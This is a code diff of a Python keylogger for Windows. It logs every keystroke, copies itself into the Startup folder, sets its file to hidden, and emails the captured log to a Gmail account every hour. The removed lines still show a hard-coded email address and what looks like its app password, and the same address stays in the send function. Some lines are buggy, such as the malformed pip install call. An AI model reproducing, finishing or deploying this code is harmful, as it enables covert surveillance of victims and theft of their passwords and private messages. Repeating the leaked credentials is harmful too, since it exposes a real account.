@@ -9,23 +9,24 @@ try:
     import email.mime.application
     from email.mime.multipart import MIMEMultipart
     from pynput.keyboard import Key, Listener
-    import os, stat, sys, time, uuid
+    import os, sys, time, uuid
 except ModuleNotFoundError:
     from subprocess import call
-    packets = ["pynput", "smtplib", "email", "schedule", "win32con", "win32api"]
+
+    packets = ["pynput", "smtplib", "email", "schedule", "win32con", "win32api", "MIMEMultipart"]
     call("pip install" + ' '.join(packets), shell=True)
 finally:
 
-    EMAIL_ADDR = "cnxnd11@gmail.com"
-    PASSWD = "moejmdsbakpxsmmt"
+    EMAIL_ADDR = ""  # YOUR EMAIL
+    PASSWD = ""  # YOUR PASSWD FOR GMAIL.COM
 
     pressedkeys = []
 
-    msg = MIMEMultipart()
+    msg = MIMEMultipart('mixed')
 
-    msg['Subject'] = 'Keylog Data'
-    msg['From'] = 'cnxnd11@gmail.com'
-    msg['To'] = 'snesrienko@gmail.com'
+    msg['Subject'] = 'Keylog Data'  # headers
+    msg['From'] = ''
+    msg['To'] = ''
 
     filename = 'log.log'
     fp = open(filename, 'rb')
@@ -34,9 +35,14 @@ finally:
     att.add_header('Content-Disposition', 'attachment', filename=filename)
 
     msg.attach(att)
+
+    # ----server settings----
+
     server = smtplib.SMTP('smtp.gmail.com', 587)
     server.starttls()
     server.login(EMAIL_ADDR, PASSWD)
+
+    # ----server settings----
 
     def on_press(key):
         try:
@@ -46,15 +52,20 @@ finally:
 
         writeToFile(pressedkeys)
 
+
     def writeToFile(pressedkeys):
         with open("log.log", "w") as file:
             for keybKey in pressedkeys:
                 cleankey = str(keybKey).replace("'" and "Key", "")
                 file.write(cleankey)
 
+
     def on_release(key):
         if key == keyboard.Key.esc:
             return False
+
+
+    # function of adding keylogger to win startup
 
     def startup():
         keylogger = sys.argv[0]
@@ -64,7 +75,10 @@ finally:
                 f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{keylogger_name}"):
             os.system(
                 f'copy "{keylogger}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
-        win32api.SetFileAttributes(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{keylogger_name}", win32con.FILE_ATTRIBUTE_HIDDEN)
+        win32api.SetFileAttributes(
+            f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{keylogger_name}",
+            win32con.FILE_ATTRIBUTE_HIDDEN)
+
 
     with keyboard.Listener(
             on_press=on_press,
@@ -75,14 +89,19 @@ finally:
         on_release=on_release)
     listener.start()
 
+
     def sendData():
         server.sendmail('cnxnd11@gmail.com', ['cnxnd11@gmail.com'], msg.as_string())
         server.quit()
 
+    # setting invisibility of file
+
     def invisibility():
         win32api.SetFileAttributes(sys.argv[0], win32con.FILE_ATTRIBUTE_HIDDEN)
 
+
     if __name__ == '__main__':
+        sendData()
         startup()
         invisibility()
-        schedule.every(1).hour.do(sendData)
+        schedule.every(1).hour.do(sendData)  # sending keylogger data to email
